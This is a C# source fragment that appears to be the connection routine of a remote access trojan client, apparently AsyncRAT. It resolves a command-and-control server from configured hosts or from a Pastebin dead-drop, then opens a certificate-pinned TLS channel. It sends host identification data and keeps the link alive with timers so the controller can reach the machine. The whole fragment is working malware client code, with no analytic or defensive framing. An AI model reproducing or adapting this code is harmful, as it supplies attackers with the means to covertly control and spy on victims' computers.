{
    try
    {

        TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        {
            ReceiveBufferSize = 50 * 1024,
            SendBufferSize = 50 * 1024,
        };

        if (Settings.Pastebin == "null")
        {
            string ServerIP = Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)];
            int ServerPort = Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]);

            if (IsValidDomainName(ServerIP)) //check if the address is alphanumric (meaning its a domain)
            {
                IPAddress[] addresslist = Dns.GetHostAddresses(ServerIP); //get all IP's connected to that domain

                foreach (IPAddress theaddress in addresslist) //we do a foreach becasue a domain can lead to multiple IP's
                {
                    try
                    {
                        TcpClient.Connect(theaddress, ServerPort); //lets try and connect!
                        if (TcpClient.Connected) break;
                    }
                    catch { }
                }
            }
            else
            {
                TcpClient.Connect(ServerIP, ServerPort); //legacy mode connect (no DNS)
            }
        }
        else
        {
            using (WebClient wc = new WebClient())
            {
                NetworkCredential networkCredential = new NetworkCredential("", "");
                wc.Credentials = networkCredential;
                string resp = wc.DownloadString(Settings.Pastebin);
                string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                Settings.Hosts = spl[0];
                Settings.Ports = spl[new Random().Next(1, spl.Length)];
                TcpClient.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
            }
        }

        if (TcpClient.Connected)
        {
            Debug.WriteLine("Connected!");
            IsConnected = true;
            SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
            SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
            HeaderSize = 4;
            Buffer = new byte[HeaderSize];
            Offset = 0;
            Send(IdSender.SendInfo());
            Interval = 0;
            ActivatePong = false;
            KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
            Ping = new Timer(new TimerCallback(Pong), null, 1, 1);
            SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
        }
        else
        {
            IsConnected = false;
            return;
        }
    }
    catch
    {
        Debug.WriteLine("Disconnected!");
        IsConnected = false;
        return;
    }
}

private static bool IsValidDomainName(string name)
{
    return Uri.CheckHostName(name) != UriHostNameType.Unknown;
}

private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
{
#if DEBUG
    return true;
#endif
    return Settings.ServerCertificate.Equals(certificate);
}

public static void Reconnect()
{
    try
    {
        SslClient?.Dispose();
        TcpClient?.Dispose();
        Ping?.Dispose();
        KeepAlive?.Dispose();
    }
    catch { }
    IsConnected = false;
}